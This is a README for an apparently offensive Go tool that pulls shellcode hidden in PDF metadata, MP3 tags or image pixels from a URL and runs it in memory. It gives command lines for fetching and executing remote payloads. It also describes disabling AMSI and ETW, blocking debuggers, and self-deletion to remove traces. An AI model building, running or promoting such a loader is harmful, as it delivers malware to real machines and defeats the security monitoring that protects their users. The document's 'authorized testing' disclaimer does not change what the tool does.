# Shellcode Steganography Tool

A Go-based tool for embedding and extracting shellcode from various file formats including PDF documents, MP3 files, and images. The tool provides reliable shellcode execution using my [go-direct-syscall](https://github.com/carved4/go-direct-syscall) package for direct NT syscalls and security bypass capabilities.

## Features

### File Format Support
- **PDF Documents**: Embeds shellcode in PDF metadata fields
- **MP3 Audio Files**: Stores shellcode in ID3 tag comment fields  
- **Image Files**: Supports PNG and JPEG with LSB steganography
- **Raw Shellcode**: Direct execution of binary shellcode files

### Security Capabilities (via go-direct-syscall)
- AMSI (Anti-Malware Scan Interface) bypass
- ETW (Event Tracing for Windows) disable
- Debug control prevention
- Trace event logging disable
- Remote debugger attachment blocking

### Reliability Features
- Automatic memory compatibility handling for Go/Windows syscall interactions
- Fallback mechanisms for consistent shellcode execution
- Self-deletion capabilities to remove traces
- Thread-safe execution with proper OS thread locking

## Installation

### Prerequisites
- Go 1.23+ (1.24.3+ recommended)
- Windows operating system
- Git for cloning the repository

### Setup
```bash
git clone https://github.com/carved4/shellcode-stego.git
cd shellcode-stego/cmd
go mod tidy
go build -v
```

## Usage

### Basic Commands

#### PDF Extraction
```bash
./cmd.exe -pdf https://example.com/document.pdf
```

#### MP3 Extraction  
```bash
./cmd.exe -mp3 https://example.com/audio.mp3
```

#### Image Extraction
```bash
./cmd.exe -image https://example.com/picture.png
```

#### Raw Shellcode Execution
```bash
./cmd.exe -shellcode https://example.com/payload.bin
```

### Test Mode

The tool includes a built-in test mode that demonstrates the complete embed → extract → execute pipeline :3

```bash
./cmd.exe -test
```

This mode will:
1. Generate calc.exe shellcode from embedded hex
2. Embed the shellcode into the test PDF document
3. Extract the shellcode using the same extraction logic
4. Execute the shellcode with full security bypasses
5. Self-delete the executable

### Advanced Usage

#### Multiple Format Support
The tool automatically detects file formats based on content and file extensions. You can force specific extraction methods:

```bash
# Force PDF extraction even if extension suggests otherwise
./cmd.exe -pdf https://example.com/suspicious_file.txt

# Force image extraction 
./cmd.exe -image https://example.com/hidden_payload.jpg
```

#### Custom URLs
Provide any HTTP/HTTPS URL as a command line argument:

```bash
./cmd.exe -pdf https://your-server.com/document.pdf
```

If no URL is provided, the tool uses a configured default URL.

## Technical Implementation

### Memory Management
The tool implements sophisticated memory management to handle compatibility issues between Go's garbage collector and Windows NT syscalls. It includes:

- Automatic fallback from Go-allocated memory to Windows-allocated memory
- Proper cleanup of allocated memory regions
- Thread-safe execution with OS thread locking

### Steganography Methods

#### PDF Metadata
Shellcode is encoded in Base64 and stored in PDF metadata properties with the key "STEGO". The payload includes a magic header and size information for reliable extraction.

#### MP3 ID3 Tags
Data is embedded in ID3v2 comment frames with the description "STEGO" and encoded in Base64 format.

#### Image LSB
Uses least significant bit steganography across RGB channels with a magic header (0xDEADBEEFCAFEBABE) and 32-bit little-endian size field.

### Shellcode Execution
The tool uses [go-direct-syscall](https://github.com/carved4/go-direct-syscall) library for direct NT syscalls without Windows API imports:
- `NtAllocateVirtualMemory` for memory allocation
- `NtWriteVirtualMemory` for shellcode copying  
- `NtProtectVirtualMemory` for permission changes
- `NtCreateThreadEx` for thread creation
- `NtWaitForSingleObject` for synchronization

## Security Features

### Windows API Patches
The tool leverages security bypass patches from the [go-direct-syscall](https://github.com/carved4/go-direct-syscall) library:

```go
// Available patch functions from my winapi :3 
PatchAMSI()                    // Disable AMSI scanning
PatchETW()                     // Disable event tracing  
PatchDbgUiRemoteBreakin()      // Block debugger attachment
PatchNtTraceEvent()            // Disable trace logging
PatchNtSystemDebugControl()    // Prevent debug operations
ApplyAllPatches()              // Apply all stable patches
ApplyCriticalPatches()         // Apply AMSI and ETW only
```

### Self-Deletion
The executable automatically deletes itself using the `SelfDel()` function from [go-direct-syscall](https://github.com/carved4/go-direct-syscall) with the following technique:
1. Rename file to alternate data stream (ADS)
2. Mark file for deletion on handle close
3. Process continues running from memory
4. File disappears when process exits

## Error Handling

The tool implements comprehensive error handling with detailed debug output. Common error scenarios include:

- Network connectivity issues during download
- Corrupted or invalid container files
- Insufficient memory for shellcode allocation
- Missing or invalid embedded payloads

Debug output can be monitored to troubleshoot extraction and execution issues :3

## Contributing

Contributions are welcome. Please ensure any pull requests include:

- Proper error handling
- Debug output for troubleshooting
- Documentation updates
- Test coverage for new features

## Limitations

- Windows-only due to NT syscall dependencies
- Large shellcode payloads may not fit in smaller container files
- JPEG compression may affect image-based steganography reliability

## Disclaimer

This tool is intended for authorized security testing and research purposes only. Users are responsible for ensuring compliance with applicable laws and regulations. The authors assume no liability for misuse of this software.

## Credits

This tool relies heavily on my [go-direct-syscall](https://github.com/carved4/go-direct-syscall) library for:
- Direct NT syscall execution without Windows API imports
- Security bypass patches (AMSI, ETW, debug controls)
- Self-deletion capabilities
- Memory management and thread operations

The steganographic embedding and extraction functionality is implemented independently in this project.

## License

This project is licensed under the MIT License. See LICENSE file for details.

---

For issues, feature requests, or questions, please open an issue on the project repository. The tool has been tested with various shellcode payloads and container file formats to ensure reliable operation across different scenarios :3 